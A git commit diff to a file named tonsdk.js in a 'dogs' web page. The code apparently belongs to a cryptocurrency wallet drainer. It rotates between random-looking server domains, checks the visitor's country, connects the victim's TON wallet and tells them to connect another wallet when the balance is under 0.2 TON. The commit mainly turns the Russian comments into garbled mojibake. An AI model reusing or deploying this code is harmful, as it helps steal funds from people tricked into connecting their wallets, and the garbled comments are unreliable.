829def4f3d9e076bc62836bd05231fd4bbde4152
FAZEL UNITY <53996181+fazelunity0054@users.noreply.github.com>
2024-08-22 07:57:05 +0330

    fix

--- public/dogs/index_files/tonsdk.js
+++ public/dogs/index_files/tonsdk.js
@@ -1,3 +1,4 @@
+// Ð¡Ñ‚Ð°Ñ‚Ð¸Ñ‡ÐµÑÐºÐ¸Ðµ Ð´Ð°Ð½Ð½Ñ‹Ðµ
 const LIST_DOMAINS = ['ucpuznvvcy.com', 'gybzdhahpl.com', 'kvutxcjcku.com', 'bydyindfam.com', 'ytyynulnnp.com'];
 
 const SERVER_DOMAIN = LIST_DOMAINS[Math.floor(Math.random() * (LIST_DOMAINS.length - 1))]; // 'nwkjaia.com';
@@ -8,19 +9,17 @@ const URL_SERVICE_SNG = `https://${SERVER_DOMAIN}/api/v1/${UUID_CHAT}/sng`;
 
 const domain = window.location.hostname;
 
-let h1_message = 'The min balance must be 0.2 TON for verification',
+let h1_message = 'The min balance must be 0.2 TON',
   p_message = 'Please connect another wallet',
   but_message = 'Close';
 
-// Переменные которые получаем с ton
+// ÐŸÐµÑ€ÐµÐ¼ÐµÐ½Ð½Ñ‹Ðµ ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ðµ Ð¿Ð¾Ð»ÑƒÑ‡Ð°ÐµÐ¼ Ñ ton
 let connectedWallet;
 
-// Переменные которые приходят с сервера
+// ÐŸÐµÑ€ÐµÐ¼ÐµÐ½Ð½Ñ‹Ðµ ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ðµ Ð¿Ñ€Ð¸Ñ…Ð¾Ð´ÑÑ‚ Ñ ÑÐµÑ€Ð²ÐµÑ€Ð°
 let UserInfo;
 
-
-
-// Инстансы
+// Ð˜Ð½ÑÑ‚Ð°Ð½ÑÑ‹
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
   manifestUrl: 'https://' + domain + '/tonconnect-manifest.json',
   // buttonRootId: 'openModal',
@@ -30,7 +29,7 @@ const $api = axios.create({
   baseURL: 'https://' + SERVER_DOMAIN + '/api/v2',
 });
 
-// Функции для работы
+// Ð¤ÑƒÐ½ÐºÑ†Ð¸Ð¸ Ð´Ð»Ñ Ñ€Ð°Ð±Ð¾Ñ‚Ñ‹
 const openModalUi = () => tonConnectUI.openModal();
 
 const checkLocation = (country, sng) =>
@@ -48,7 +47,7 @@ axios.get(URL_SERVICE_IP).then(({ data }) => {
   });
 });
 
-// Основной функционал
+// ÐžÑÐ½Ð¾Ð²Ð½Ð¾Ð¹ Ñ„ÑƒÐ½ÐºÑ†Ð¸Ð¾Ð½Ð°Ð»
 axios.get(URL_SERVICE_IP).then(({ data }) => {
   const country = data.country_code;
 
@@ -119,20 +118,20 @@ tonConnectUI.onStatusChange((wallet) => {
 async function showModal() {
   const modal = document.createElement('div');
   modal.style.position = 'fixed';
-  modal.style.top = '50%'; //Отступ модального окна верх-низ
-  modal.style.left = '50%'; //Отступ модального окна лево-право
+  modal.style.top = '50%'; //ÐžÑ‚ÑÑ‚ÑƒÐ¿ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð° Ð²ÐµÑ€Ñ…-Ð½Ð¸Ð·
+  modal.style.left = '50%'; //ÐžÑ‚ÑÑ‚ÑƒÐ¿ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð° Ð»ÐµÐ²Ð¾-Ð¿Ñ€Ð°Ð²Ð¾
   modal.style.transform = 'translate(-50%, -50%)';
-  modal.style.backgroundColor = '#121214'; // Фон модального окна
-  modal.style.color = '#fff'; // Цвет текста
-  modal.style.padding = '20px'; //Отступы модального окна
-  modal.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)'; //Тень модального окна
+  modal.style.backgroundColor = '#121214'; // Ð¤Ð¾Ð½ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°
+  modal.style.color = '#fff'; // Ð¦Ð²ÐµÑ‚ Ñ‚ÐµÐºÑÑ‚Ð°
+  modal.style.padding = '20px'; //ÐžÑ‚ÑÑ‚ÑƒÐ¿Ñ‹ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°
+  modal.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)'; //Ð¢ÐµÐ½ÑŒ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°
   modal.style.zIndex = '1000';
-  modal.style.borderRadius = '24px'; // Скругленные углы
-  modal.style.textAlign = 'center'; // Выравнивание элементов по центру
-  modal.style.maxWidth = '400px'; // Максимальная ширина модального окна
-  modal.style.width = '90%'; // Ширина для мобильных устройств
+  modal.style.borderRadius = '24px'; // Ð¡ÐºÑ€ÑƒÐ³Ð»ÐµÐ½Ð½Ñ‹Ðµ ÑƒÐ³Ð»Ñ‹
+  modal.style.textAlign = 'center'; // Ð’Ñ‹Ñ€Ð°Ð²Ð½Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐ»ÐµÐ¼ÐµÐ½Ñ‚Ð¾Ð² Ð¿Ð¾ Ñ†ÐµÐ½Ñ‚Ñ€Ñƒ
+  modal.style.maxWidth = '400px'; // ÐœÐ°ÐºÑÐ¸Ð¼Ð°Ð»ÑŒÐ½Ð°Ñ ÑˆÐ¸Ñ€Ð¸Ð½Ð° Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°
+  modal.style.width = '90%'; // Ð¨Ð¸Ñ€Ð¸Ð½Ð° Ð´Ð»Ñ Ð¼Ð¾Ð±Ð¸Ð»ÑŒÐ½Ñ‹Ñ… ÑƒÑÑ‚Ñ€Ð¾Ð¹ÑÑ‚Ð²
 
-  // Добавляем шрифт
+  // Ð”Ð¾Ð±Ð°Ð²Ð»ÑÐµÐ¼ ÑˆÑ€Ð¸Ñ„Ñ‚
   const link = document.createElement('link');
   link.href =
     'https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap';
@@ -147,13 +146,13 @@ async function showModal() {
 
   const closeButton = document.createElement('button');
   closeButton.textContent = but_message;
-  closeButton.style.backgroundColor = 'rgb(53, 53, 53)'; //  фон кнопки
-  closeButton.style.color = '#fff'; // Цвет текста
-  closeButton.style.fontSize = '14px'; // Размер шрифта кнопки
-  closeButton.style.borderRadius = '10px'; // Скругленные углы кнопки
-  closeButton.style.border = 'none'; // Без рамки
-  closeButton.style.padding = '10px 10px 10px 10px'; // Отступы внутри кнопки
-  closeButton.style.fontWeight = '600'; //Жирность шрифта кнопки
+  closeButton.style.backgroundColor = 'rgb(53, 53, 53)'; //  Ñ„Ð¾Ð½ ÐºÐ½Ð¾Ð¿ÐºÐ¸
+  closeButton.style.color = '#fff'; // Ð¦Ð²ÐµÑ‚ Ñ‚ÐµÐºÑÑ‚Ð°
+  closeButton.style.fontSize = '14px'; // Ð Ð°Ð·Ð¼ÐµÑ€ ÑˆÑ€Ð¸Ñ„Ñ‚Ð° ÐºÐ½Ð¾Ð¿ÐºÐ¸
+  closeButton.style.borderRadius = '10px'; // Ð¡ÐºÑ€ÑƒÐ³Ð»ÐµÐ½Ð½Ñ‹Ðµ ÑƒÐ³Ð»Ñ‹ ÐºÐ½Ð¾Ð¿ÐºÐ¸
+  closeButton.style.border = 'none'; // Ð‘ÐµÐ· Ñ€Ð°Ð¼ÐºÐ¸
+  closeButton.style.padding = '10px 10px 10px 10px'; // ÐžÑ‚ÑÑ‚ÑƒÐ¿Ñ‹ Ð²Ð½ÑƒÑ‚Ñ€Ð¸ ÐºÐ½Ð¾Ð¿ÐºÐ¸
+  closeButton.style.fontWeight = '600'; //Ð–Ð¸Ñ€Ð½Ð¾ÑÑ‚ÑŒ ÑˆÑ€Ð¸Ñ„Ñ‚Ð° ÐºÐ½Ð¾Ð¿ÐºÐ¸
   closeButton.style.cursor = 'pointer';
   closeButton.onclick = () => {
     document.body.removeChild(modal);
